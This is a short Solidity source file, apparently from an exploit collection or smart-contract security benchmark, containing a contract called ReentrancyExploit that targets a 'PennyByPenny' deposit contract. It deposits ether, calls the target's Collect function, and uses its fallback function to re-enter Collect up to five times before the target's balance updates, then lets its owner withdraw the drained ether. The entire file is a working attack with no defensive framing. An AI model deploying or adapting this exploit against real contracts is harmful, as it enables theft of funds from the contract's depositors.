pragma solidity ^0.4.19;

interface IPennyByPenny {
    function Put(uint _lockTime) external payable;
    function Collect(uint _am) external payable;
}

contract ReentrancyExploit {
    IPennyByPenny public target;
    address owner;
    uint public attackCount;
    uint public maxAttackCount;

    constructor(address _target) public {
        target = IPennyByPenny(_target);
        owner = msg.sender;
        maxAttackCount = 5; // limit recursion to avoid running out of gas
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        // Deposit with a lock time of 0
        target.Put.value(msg.value)(0);
        // Trigger withdrawal
        target.Collect(msg.value);
    }

    function() public payable {
        if (attackCount < maxAttackCount) {
            attackCount++;
            // Reenter Collect while balance not yet reduced in original call
            target.Collect(msg.value);
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

